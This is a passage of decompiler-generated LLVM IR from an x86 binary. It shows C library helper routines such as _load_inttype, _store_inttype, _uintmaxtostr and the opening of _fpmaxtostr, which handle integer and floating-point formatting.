  br i1 %v1_804e3db, label %dec_label_pc_804e3e2, label %dec_label_pc_804e3dd

dec_label_pc_804e3dd:                             ; preds = %dec_label_pc_804e3d5
  %v2_804e3dd = and i32 %v3_804e3ab, 2
  %v3_804e3dd = icmp eq i32 %v2_804e3dd, 0
  br i1 %v3_804e3dd, label %dec_label_pc_804e401, label %dec_label_pc_804e3e2

dec_label_pc_804e3e2:                             ; preds = %dec_label_pc_804e3dd, %dec_label_pc_804e3d5
  %v1_804e3e2 = and i32 %v3_804e3ab, 1024
  store i32 %v1_804e3e2, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_804e3e2, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_804e3f5 = call i32 @__GI_fseek(i32 %v0_804e3f4, i32 0, i32 %tmp16, i32 %v1_804e3e2)
  store i32 %v5_804e3f5, i32* %eax.global-to-local, align 4
  %v1_804e3fd = icmp eq i32 %v5_804e3f5, 0
  %v1_804e3ff = icmp eq i1 %v1_804e3fd, false
  br i1 %v1_804e3ff, label %dec_label_pc_804e3be, label %dec_label_pc_804e3e2.dec_label_pc_804e401_crit_edge

dec_label_pc_804e3e2.dec_label_pc_804e401_crit_edge: ; preds = %dec_label_pc_804e3e2
  %v0_804e401.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e401

dec_label_pc_804e401:                             ; preds = %dec_label_pc_804e3e2.dec_label_pc_804e401_crit_edge, %dec_label_pc_804e3dd, %dec_label_pc_804e3d0
  %v2_804e406 = phi i32 [ %v0_804e401.pre, %dec_label_pc_804e3e2.dec_label_pc_804e401_crit_edge ], [ %v0_804e3f4, %dec_label_pc_804e3dd ], [ %v0_804e3f4, %dec_label_pc_804e3d0 ]
  %v1_804e401 = inttoptr i32 %v2_804e406 to i32*
  %v2_804e401 = load i32, i32* %v1_804e401, align 4
  %v1_804e403 = and i32 %v2_804e401, -4
  store i32 %v1_804e403, i32* %eax.global-to-local, align 4
  %v1_804e406 = trunc i32 %v1_804e403 to i16
  %v3_804e406 = inttoptr i32 %v2_804e406 to i16*
  store i16 %v1_804e406, i16* %v3_804e406, align 2
  %v0_804e409 = load i32, i32* @ebx, align 4
  %v1_804e409 = add i32 %v0_804e409, 8
  %v2_804e409 = inttoptr i32 %v1_804e409 to i32*
  %v3_804e409 = load i32, i32* %v2_804e409, align 4
  store i32 %v3_804e409, i32* %eax.global-to-local, align 4
  %v2_804e40c = add i32 %v0_804e409, 24
  %v3_804e40c = inttoptr i32 %v2_804e40c to i32*
  store i32 %v3_804e409, i32* %v3_804e40c, align 4
  %v0_804e40f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e40f = load i32, i32* @ebx, align 4
  %v2_804e40f = add i32 %v1_804e40f, 16
  %v3_804e40f = inttoptr i32 %v2_804e40f to i32*
  store i32 %v0_804e40f, i32* %v3_804e40f, align 4
  %v0_804e412 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e412 = load i32, i32* @ebx, align 4
  %v2_804e412 = add i32 %v1_804e412, 20
  %v3_804e412 = inttoptr i32 %v2_804e412 to i32*
  store i32 %v0_804e412, i32* %v3_804e412, align 4
  %v0_804e415.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e415

dec_label_pc_804e415:                             ; preds = %dec_label_pc_804e3cb, %dec_label_pc_804e401
  %v2_804e41c = phi i32 [ %v0_804e3f4, %dec_label_pc_804e3cb ], [ %v0_804e415.pre, %dec_label_pc_804e401 ]
  %v1_804e415 = inttoptr i32 %v2_804e41c to i32*
  %v2_804e415 = load i32, i32* %v1_804e415, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804e419 = or i32 %v2_804e415, 64
  store i32 %v1_804e419, i32* %eax.global-to-local, align 4
  %v1_804e41c = trunc i32 %v1_804e419 to i16
  %v3_804e41c = inttoptr i32 %v2_804e41c to i16*
  store i16 %v1_804e41c, i16* %v3_804e41c, align 2
  %v0_804e41f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e41f = urem i32 %v0_804e41f, 65536
  store i32 %v1_804e41f, i32* %eax.global-to-local, align 4
  %v3_804e422 = and i32 %v0_804e41f, 2816
  %v4_804e422 = icmp eq i32 %v3_804e422, 0
  %v1_804e425 = icmp eq i1 %v4_804e422, false
  br i1 %v1_804e425, label %dec_label_pc_804e42d, label %dec_label_pc_804e427

dec_label_pc_804e427:                             ; preds = %dec_label_pc_804e415
  %v0_804e427 = load i32, i32* @ebx, align 4
  %v1_804e427 = add i32 %v0_804e427, 12
  %v2_804e427 = inttoptr i32 %v1_804e427 to i32*
  %v3_804e427 = load i32, i32* %v2_804e427, align 4
  store i32 %v3_804e427, i32* %eax.global-to-local, align 4
  %v2_804e42a = add i32 %v0_804e427, 28
  %v3_804e42a = inttoptr i32 %v2_804e42a to i32*
  store i32 %v3_804e427, i32* %v3_804e42a, align 4
  br label %dec_label_pc_804e42d

dec_label_pc_804e42d:                             ; preds = %dec_label_pc_804e415, %dec_label_pc_804e3be, %dec_label_pc_804e427
  %v0_804e42d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e42d, i32* %eax.global-to-local, align 4
  %v2_804e42f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e42f, i32* %edx.global-to-local, align 4
  store i32 %v0_804e38c, i32* @ebx, align 4
  ret i32 %v0_804e42d

; uselistorder directives
  uselistorder i32 %v0_804e41f, { 1, 0 }
  uselistorder i32 %v1_804e3e2, { 1, 0, 2 }
  uselistorder i32 %v0_804e3f4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_804e398, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e38c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 13, 3, 6, 5, 14, 4, 1, 2, 8, 9, 7, 11, 12, 10 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e42d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e415, { 1, 0 }
  uselistorder label %dec_label_pc_804e3ab, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804e434 = icmp slt i32 %tmp5, 0
  %v3_804e465 = and i32 %tmp4, 2048
  %v4_804e465 = icmp eq i32 %v3_804e465, 0
  br i1 %v5_804e434, label %dec_label_pc_804e465, label %dec_label_pc_804e443

dec_label_pc_804e443:                             ; preds = %entry
  %v1_804e446 = icmp eq i1 %v4_804e465, false
  br i1 %v1_804e446, label %dec_label_pc_804e46a, label %dec_label_pc_804e448

dec_label_pc_804e448:                             ; preds = %dec_label_pc_804e443
  %v6_804e448 = icmp eq i32 %tmp4, 256
  %v1_804e44e = inttoptr i32 %tmp to i32*
  %v2_804e44e = load i32, i32* %v1_804e44e, align 4
  %v1_804e450 = icmp eq i1 %v6_804e448, false
  br i1 %v1_804e450, label %dec_label_pc_804e457, label %dec_label_pc_804e452

dec_label_pc_804e452:                             ; preds = %dec_label_pc_804e448
  %v1_804e452 = urem i32 %v2_804e44e, 256
  br label %dec_label_pc_804e462

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e448
  %v6_804e457 = icmp eq i32 %tmp4, 512
  %v1_804e45d = icmp eq i1 %v6_804e457, false
  br i1 %v1_804e45d, label %dec_label_pc_804e462, label %dec_label_pc_804e45f

dec_label_pc_804e45f:                             ; preds = %dec_label_pc_804e457
  %v1_804e45f = urem i32 %v2_804e44e, 65536
  br label %dec_label_pc_804e462

dec_label_pc_804e462:                             ; preds = %dec_label_pc_804e457, %dec_label_pc_804e452, %dec_label_pc_804e45f
  %v0_804e464 = phi i32 [ %v2_804e44e, %dec_label_pc_804e457 ], [ %v1_804e452, %dec_label_pc_804e452 ], [ %v1_804e45f, %dec_label_pc_804e45f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804e464

dec_label_pc_804e465:                             ; preds = %entry
  br i1 %v4_804e465, label %dec_label_pc_804e470, label %dec_label_pc_804e46a

dec_label_pc_804e46a:                             ; preds = %dec_label_pc_804e443, %dec_label_pc_804e465
  %v1_804e46a = add i32 %tmp, 4
  %v2_804e46a = inttoptr i32 %v1_804e46a to i32*
  %v3_804e46a = load i32, i32* %v2_804e46a, align 4
  store i32 %v3_804e46a, i32* @edx, align 4
  %v1_804e46d = inttoptr i32 %tmp to i32*
  %v2_804e46d = load i32, i32* %v1_804e46d, align 4
  ret i32 %v2_804e46d

dec_label_pc_804e470:                             ; preds = %dec_label_pc_804e465
  %v6_804e470 = icmp eq i32 %tmp4, 256
  %v1_804e476 = inttoptr i32 %tmp to i32*
  %v2_804e476 = load i32, i32* %v1_804e476, align 4
  %v1_804e478 = icmp eq i1 %v6_804e470, false
  br i1 %v1_804e478, label %dec_label_pc_804e47f, label %dec_label_pc_804e47a

dec_label_pc_804e47a:                             ; preds = %dec_label_pc_804e470
  %v1_804e47a = mul i32 %v2_804e476, 16777216
  %v2_804e47a = sdiv i32 %v1_804e47a, 16777216
  br label %dec_label_pc_804e488

dec_label_pc_804e47f:                             ; preds = %dec_label_pc_804e470
  %v6_804e47f = icmp eq i32 %tmp4, 512
  %v1_804e485 = icmp eq i1 %v6_804e47f, false
  br i1 %v1_804e485, label %dec_label_pc_804e488, label %dec_label_pc_804e487

dec_label_pc_804e487:                             ; preds = %dec_label_pc_804e47f
  %v1_804e487 = mul i32 %v2_804e476, 65536
  %v2_804e487 = sdiv i32 %v1_804e487, 65536
  br label %dec_label_pc_804e488

dec_label_pc_804e488:                             ; preds = %dec_label_pc_804e47f, %dec_label_pc_804e47a, %dec_label_pc_804e487
  %v0_804e488 = phi i32 [ %v2_804e476, %dec_label_pc_804e47f ], [ %v2_804e47a, %dec_label_pc_804e47a ], [ %v2_804e487, %dec_label_pc_804e487 ]
  %v1_804e488 = ashr i32 %v0_804e488, 31
  store i32 %v1_804e488, i32* @edx, align 4
  ret i32 %v0_804e488

; uselistorder directives
  uselistorder i32 %v0_804e488, { 1, 0 }
  uselistorder i32 %v2_804e476, { 2, 0, 1 }
  uselistorder i32 %v2_804e44e, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804e488, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e46a, { 1, 0 }
  uselistorder label %dec_label_pc_804e462, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e48c = load i32, i32* @ebx, align 4
  store i32 %v0_804e48c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804e491 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804e491, i32* %ebx.global-to-local, align 4
  %v4_804e495 = trunc i32 %tmp4 to i16
  %v6_804e49d = icmp eq i32 %tmp6, 256
  %v1_804e4a3 = icmp eq i1 %v6_804e49d, false
  br i1 %v1_804e4a3, label %dec_label_pc_804e4a9, label %dec_label_pc_804e4a5

dec_label_pc_804e4a5:                             ; preds = %entry
  %v2_804e4a5 = trunc i32 %tmp4 to i8
  %v4_804e4a5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804e4a5, i8* %v4_804e4a5, align 1
  br label %dec_label_pc_804e4c7

dec_label_pc_804e4a9:                             ; preds = %entry
  %v6_804e4a9 = icmp eq i32 %tmp6, 2048
  %v1_804e4af = icmp eq i1 %v6_804e4a9, false
  br i1 %v1_804e4af, label %dec_label_pc_804e4b8, label %dec_label_pc_804e4b1

dec_label_pc_804e4b1:                             ; preds = %dec_label_pc_804e4a9
  %sext2 = mul i32 %tmp4, 65536
  %v1_804e4b1 = sdiv i32 %sext2, 65536
  %v3_804e4b1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804e4b1, i32* %v3_804e4b1, align 4
  %v0_804e4b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e4b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e4b3 = add i32 %v1_804e4b3, 4
  %v3_804e4b3 = inttoptr i32 %v2_804e4b3 to i32*
  store i32 %v0_804e4b3, i32* %v3_804e4b3, align 4
  br label %dec_label_pc_804e4c7

dec_label_pc_804e4b8:                             ; preds = %dec_label_pc_804e4a9
  %v6_804e4b8 = icmp eq i32 %tmp6, 512
  %v1_804e4be = icmp eq i1 %v6_804e4b8, false
  br i1 %v1_804e4be, label %dec_label_pc_804e4c5, label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e4b8
  store i16 %v4_804e495, i16* %tmp5, align 2
  br label %dec_label_pc_804e4c7

dec_label_pc_804e4c5:                             ; preds = %dec_label_pc_804e4b8
  %sext3 = mul i32 %tmp4, 65536
  %v1_804e4c5 = sdiv i32 %sext3, 65536
  %v3_804e4c5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804e4c5, i32* %v3_804e4c5, align 4
  br label %dec_label_pc_804e4c7

dec_label_pc_804e4c7:                             ; preds = %dec_label_pc_804e4c0, %dec_label_pc_804e4b1, %dec_label_pc_804e4a5, %dec_label_pc_804e4c5
  %v2_804e4c7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e4c7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804e4c8 = sdiv i32 %sext, 65536
  ret i32 %v1_804e4c8

; uselistorder directives
  uselistorder label %dec_label_pc_804e4c7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804e4d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e4d7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804e4e3 = icmp slt i32 %arg4, 0
  %v1_804e4e5 = icmp eq i1 %v2_804e4e3, false
  br i1 %v1_804e4e5, label %dec_label_pc_804e506, label %dec_label_pc_804e4e7

dec_label_pc_804e4e7:                             ; preds = %entry
  %v1_804e4e7 = sub i32 0, %arg4
  store i32 %v1_804e4e7, i32* %esi.global-to-local, align 4
  %v2_804e4e9 = icmp slt i32 %arg3, 0
  %v1_804e4eb = icmp eq i1 %v2_804e4e9, false
  br i1 %v1_804e4eb, label %dec_label_pc_804e506, label %dec_label_pc_804e4ed

dec_label_pc_804e4ed:                             ; preds = %dec_label_pc_804e4e7
  %v1_804e4ed = sub i32 0, %arg2
  %v5_804e4ed = icmp ne i32 %arg2, 0
  store i32 %v1_804e4ed, i32* %ecx.global-to-local, align 4
  %v2_804e4ef = zext i1 %v5_804e4ed to i32
  %v3_804e4ef = add i32 %v2_804e4ef, %arg3
  %v1_804e4f2 = sub i32 0, %v3_804e4ef
  store i32 %v1_804e4f2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e506

dec_label_pc_804e506:                             ; preds = %entry, %dec_label_pc_804e4e7, %dec_label_pc_804e4ed
  %v0_804e50b = phi i32 [ %v1_804e4e7, %dec_label_pc_804e4ed ], [ %v1_804e4e7, %dec_label_pc_804e4e7 ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_804e4ed ], [ 0, %dec_label_pc_804e4e7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804e50b
  %tmp30 = urem i32 -1, %v0_804e50b
  store i8 0, i8* %arg1, align 1
  %v1_804e510 = add i32 %tmp30, 1
  %v1_804e511 = load i32, i32* %esi.global-to-local, align 4
  %v12_804e511 = icmp eq i32 %v1_804e510, %v1_804e511
  %v1_804e51b = icmp eq i1 %v12_804e511, false
  br i1 %v1_804e51b, label %dec_label_pc_804e52a, label %dec_label_pc_804e51d

dec_label_pc_804e51d:                             ; preds = %dec_label_pc_804e506
  %v1_804e51d = add i32 %div, 1
  br label %dec_label_pc_804e52a

dec_label_pc_804e52a:                             ; preds = %dec_label_pc_804e506, %dec_label_pc_804e51d
  %stack_var_-20.0.off0 = phi i32 [ %v1_804e510, %dec_label_pc_804e506 ], [ 0, %dec_label_pc_804e51d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804e506 ], [ %v1_804e51d, %dec_label_pc_804e51d ]
  %v0_804e52a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804e52a, i32* %ebp.global-to-local, align 4
  %v0_804e52c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e52c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e530

dec_label_pc_804e530:                             ; preds = %dec_label_pc_804e57e, %dec_label_pc_804e52a
  %v0_804e567 = phi i32 [ %v0_804e580, %dec_label_pc_804e57e ], [ %v0_804e52a, %dec_label_pc_804e52a ]
  %v0_804e534 = phi i32 [ %v1_804e582, %dec_label_pc_804e57e ], [ %v0_804e52c, %dec_label_pc_804e52a ]
  %v1_804e530 = icmp eq i32 %v0_804e534, 0
  br i1 %v1_804e530, label %dec_label_pc_804e567, label %dec_label_pc_804e534

dec_label_pc_804e534:                             ; preds = %dec_label_pc_804e530
  %v0_804e538 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_804e534, %v0_804e538
  %tmp31 = urem i32 %v0_804e534, %v0_804e538
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_804e567, %v0_804e538
  %tmp32 = urem i32 %v0_804e567, %v0_804e538
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_804e54b = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_804e54f = add i32 %tmp32, %v6_804e54b
  %v8_804e555 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_804e55a = add i32 %div7, %v8_804e555
  store i32 %v2_804e55a, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_804e54f, %v0_804e538
  %tmp33 = urem i32 %v2_804e54f, %v0_804e538
  %v2_804e562 = add i32 %div8, %v2_804e55a
  br label %dec_label_pc_804e56f

dec_label_pc_804e567:                             ; preds = %dec_label_pc_804e530
  %v0_804e56b = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_804e567, %v0_804e56b
  %tmp34 = urem i32 %v0_804e567, %v0_804e56b
  br label %dec_label_pc_804e56f

dec_label_pc_804e56f:                             ; preds = %dec_label_pc_804e534, %dec_label_pc_804e567
  %v13_804e575 = phi i32 [ %tmp33, %dec_label_pc_804e534 ], [ %tmp34, %dec_label_pc_804e567 ]
  %storemerge = phi i32 [ %v2_804e562, %dec_label_pc_804e534 ], [ %div10, %dec_label_pc_804e567 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804e56f = load i32, i32* %edi.global-to-local, align 4
  %v1_804e56f = add i32 %v0_804e56f, -1
  store i32 %v1_804e56f, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_804e575, 10
  br i1 %tmp, label %dec_label_pc_804e575, label %dec_label_pc_804e57a

dec_label_pc_804e575:                             ; preds = %dec_label_pc_804e56f
  %v2_804e575 = add i32 %v13_804e575, 48
  %v12_804e575 = and i32 %v2_804e575, 255
  %v14_804e575 = and i32 %v13_804e575, -256
  %v15_804e575 = or i32 %v12_804e575, %v14_804e575
  br label %dec_label_pc_804e57e

dec_label_pc_804e57a:                             ; preds = %dec_label_pc_804e56f
  %v6_804e57a = add i32 %v13_804e575, %arg5
  %v21_804e57a = and i32 %v6_804e57a, 255
  %v23_804e57a = and i32 %v13_804e575, -256
  %v24_804e57a = or i32 %v21_804e57a, %v23_804e57a
  br label %dec_label_pc_804e57e

dec_label_pc_804e57e:                             ; preds = %dec_label_pc_804e575, %dec_label_pc_804e57a
  %storemerge9 = phi i32 [ %v15_804e575, %dec_label_pc_804e575 ], [ %v24_804e57a, %dec_label_pc_804e57a ]
  %v1_804e57e = trunc i32 %storemerge9 to i8
  %v3_804e57e = inttoptr i32 %v1_804e56f to i8*
  store i8 %v1_804e57e, i8* %v3_804e57e, align 1
  %v0_804e580 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e582 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e582 = or i32 %v1_804e582, %v0_804e580
  %v3_804e582 = icmp eq i32 %v2_804e582, 0
  %v1_804e584 = icmp eq i1 %v3_804e582, false
  br i1 %v1_804e584, label %dec_label_pc_804e530, label %dec_label_pc_804e586

dec_label_pc_804e586:                             ; preds = %dec_label_pc_804e57e
  %v4_804e586 = icmp eq i32 %storemerge11, 0
  br i1 %v4_804e586, label %dec_label_pc_804e591, label %dec_label_pc_804e58d

dec_label_pc_804e58d:                             ; preds = %dec_label_pc_804e586
  %v0_804e58d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e58d = add i32 %v0_804e58d, -1
  store i32 %v1_804e58d, i32* %edi.global-to-local, align 4
  %v1_804e58e = inttoptr i32 %v1_804e58d to i8*
  store i8 45, i8* %v1_804e58e, align 1
  br label %dec_label_pc_804e591

dec_label_pc_804e591:                             ; preds = %dec_label_pc_804e586, %dec_label_pc_804e58d
  %v0_804e594 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804e594

; uselistorder directives
  uselistorder i32 %v13_804e575, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804e54f, { 1, 0 }
  uselistorder i32 %v0_804e538, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804e534, { 1, 0, 2 }
  uselistorder i32 %v0_804e567, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e510, { 1, 0 }
  uselistorder i32 %v0_804e50b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e591, { 1, 0 }
  uselistorder label %dec_label_pc_804e57e, { 1, 0 }
  uselistorder label %dec_label_pc_804e56f, { 1, 0 }
  uselistorder label %dec_label_pc_804e52a, { 1, 0 }
  uselistorder label %dec_label_pc_804e506, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_1()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_9()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e59d = load i32, i32* @edi, align 4
  %v0_804e59e = load i32, i32* @esi, align 4
  %v0_804e59f = load i32, i32* @ebx, align 4
  store i32 %v0_804e59f, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_804e5b4 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804e5b4 = add i3 %v4_804e5b4, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_804e5b4, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804e5bb = add i32 %tmp156, 4
  %v2_804e5bb = inttoptr i32 %v1_804e5bb to i32*
  %v3_804e5bb = load i32, i32* %v2_804e5bb, align 4
  store i32 %v3_804e5bb, i32* %eax.global-to-local, align 4
  %v1_804e5c2 = add i32 %tmp156, 8
  %v2_804e5c2 = inttoptr i32 %v1_804e5c2 to i8*
  %v3_804e5c2 = load i8, i8* %v2_804e5c2, align 1
  %v4_804e5c2 = zext i8 %v3_804e5c2 to i32
  %v6_804e5c2 = and i32 %v0_804e59f, -256
  %v7_804e5c2 = or i32 %v4_804e5c2, %v6_804e5c2
  store i32 %v7_804e5c2, i32* %ebx.global-to-local, align 4
  %v1_804e5c5 = inttoptr i32 %tmp156 to i32*
  %v2_804e5c5 = load i32, i32* %v1_804e5c5, align 4
  store i32 %v2_804e5c5, i32* %ebp.global-to-local, align 4
  %v2_804e5d1 = or i8 %v3_804e5c2, 32
  %v7_804e5d1 = zext i8 %v2_804e5d1 to i32
  %v9_804e5d1 = and i32 %v3_804e5bb, -256
  %v10_804e5d1 = or i32 %v7_804e5d1, %v9_804e5d1
  store i32 %v10_804e5d1, i32* %eax.global-to-local, align 4
  %v10_804e5d3 = icmp eq i8 %v2_804e5d1, 97
  %v1_804e5d9 = icmp eq i1 %v10_804e5d3, false
  br i1 %v1_804e5d9, label %dec_label_pc_804e5e2, label %dec_label_pc_804e5db

dec_label_pc_804e5db:                             ; preds = %entry
  %v2_804e5db = add i8 %v3_804e5c2, 6
  %v15_804e5db = zext i8 %v2_804e5db to i32
  %v18_804e5db = or i32 %v15_804e5db, %v6_804e5c2
  store i32 %v18_804e5db, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e5e2

dec_label_pc_804e5e2:                             ; preds = %entry, %dec_label_pc_804e5db
  %stack_var_-207.0 = phi i8 [ %v3_804e5c2, %entry ], [ %v2_804e5db, %dec_label_pc_804e5db ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804e5e9 = icmp slt i32 %v2_804e5c5, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_804e5f8 = select i1 %v2_804e5e9, i32 6, i32 %v2_804e5c5
  store i32 %v3_804e5f8, i32* %ebp.global-to-local, align 4
  %v1_804e5fb = add i32 %tmp156, 12
  %v2_804e5fb = inttoptr i32 %v1_804e5fb to i32*
  %v3_804e5fb = load i32, i32* %v2_804e5fb, align 4
  store i32 %v3_804e5fb, i32* %eax.global-to-local, align 4
  %v2_804e5fe = and i32 %v3_804e5fb, 2
  %v3_804e5fe = icmp eq i32 %v2_804e5fe, 0
  br i1 %v3_804e5fe, label %dec_label_pc_804e60c, label %dec_label_pc_804e618

dec_label_pc_804e60c:                             ; preds = %dec_label_pc_804e5e2
  %v2_804e60c = urem i32 %v3_804e5fb, 2
  %tmp192 = trunc i32 %v2_804e60c to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_804e618

dec_label_pc_804e618:                             ; preds = %dec_label_pc_804e60c, %dec_label_pc_804e5e2
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804e5e2 ], [ %tmp193, %dec_label_pc_804e60c ]
  %not.v5_804e618 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_804e618, label %dec_label_pc_804e68f, label %dec_label_pc_804e63a

dec_label_pc_804e63a:                             ; preds = %dec_label_pc_804e618
  %v1_804e63a = add i3 %v4_804e5b4, -2
  store i3 %v1_804e63a, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_804e63e = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_804e63e, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_804e63a
  br label %dec_label_pc_804e6ca

bb180:                                            ; preds = %dec_label_pc_804e63a
  %v5_804e63e = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_804e63e, label %bb181, label %dec_label_pc_804e642

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_804e6ca

dec_label_pc_804e642:                             ; preds = %bb180
  %not.v4_804e63c = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_804e63c, label %dec_label_pc_804e6ca, label %dec_label_pc_804e75f

dec_label_pc_804e68f:                             ; preds = %dec_label_pc_804e618
  store i3 %v4_804e5b4, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804e696 = add i32 %tmp156, 16
  %v2_804e696 = inttoptr i32 %v1_804e696 to i32*
  store i32 32, i32* %v2_804e696, align 4
  %v4_804e69d = add i8 %stack_var_-207.0, -96
